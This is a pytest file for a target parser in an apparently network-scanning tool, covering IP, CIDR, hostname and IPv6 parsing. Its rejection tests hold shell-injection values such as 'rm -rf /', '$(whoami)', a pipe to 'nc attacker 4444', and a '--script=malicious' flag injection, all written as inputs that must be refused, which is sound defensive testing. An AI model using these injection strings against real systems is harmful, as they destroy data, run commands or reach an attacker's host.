"""Tests for core.target_parser – parse_target."""

import pytest

from core.exceptions import TargetValidationError
from core.target_parser import parse_target, parse_targets, Target


def test_parse_single_ip():
    t = parse_target("10.10.10.1")
    assert t.ip == "10.10.10.1"
    assert t.is_network is False
    assert t.display == "10.10.10.1"


def test_parse_cidr():
    t = parse_target("192.168.1.0/24")
    assert t.is_network is True
    assert t.network == "192.168.1.0/24"


def test_parse_single_ip_as_slash32():
    """A /32 has only 1 address, so it's normalized to a plain IP target."""
    t = parse_target("10.0.0.5/32")
    assert t.is_network is False
    assert t.ip == "10.0.0.5"


def test_parse_hostname():
    t = parse_target("dc01.corp.local")
    assert t.hostname == "dc01.corp.local"
    assert t.ip is None


def test_parse_simple_hostname():
    t = parse_target("target")
    assert t.hostname == "target"


def test_parse_ipv6():
    t = parse_target("::1")
    assert t.ip == "::1"


def test_parse_targets_list():
    results = parse_targets(["10.0.0.1", "10.0.0.2", "host.local"])
    assert len(results) == 3
    assert results[0].ip == "10.0.0.1"
    assert results[2].hostname == "host.local"


def test_display_prefers_hostname():
    t = Target(raw="example", hostname="example.com", ip="1.2.3.4")
    assert t.display == "example.com"


def test_display_fallback_raw():
    t = Target(raw="???")
    assert t.display == "???"


def test_leading_trailing_whitespace():
    t = parse_target("  10.10.10.1  ")
    assert t.ip == "10.10.10.1"


# ── Rejection paths (previously silently accepted as a "hostname") ────

def test_rejects_empty_target():
    with pytest.raises(TargetValidationError):
        parse_target("")


def test_rejects_shell_metacharacters():
    for bad in ["10.10.10.1; rm -rf /", "host`whoami`", "host$(whoami)",
                "host|nc attacker 4444", "host&&id", "host{1,2}"]:
        with pytest.raises(TargetValidationError):
            parse_target(bad)


def test_rejects_leading_dash_flag_injection():
    """A target starting with '-' could be interpreted as a CLI flag by nmap/etc."""
    with pytest.raises(TargetValidationError):
        parse_target("--script=malicious")


def test_rejects_embedded_newline():
    with pytest.raises(TargetValidationError):
        parse_target("host.local\nEvilCommand")


def test_rejects_null_byte():
    with pytest.raises(TargetValidationError):
        parse_target("host.local\x00.evil.com")


def test_rejects_oversized_target():
    with pytest.raises(TargetValidationError):
        parse_target("a" * 254)


def test_rejects_whitespace_only():
    with pytest.raises(TargetValidationError):
        parse_target("   ")


def test_parse_targets_raises_on_first_invalid_entry():
    with pytest.raises(TargetValidationError):
        parse_targets(["10.0.0.1", "host; id"])
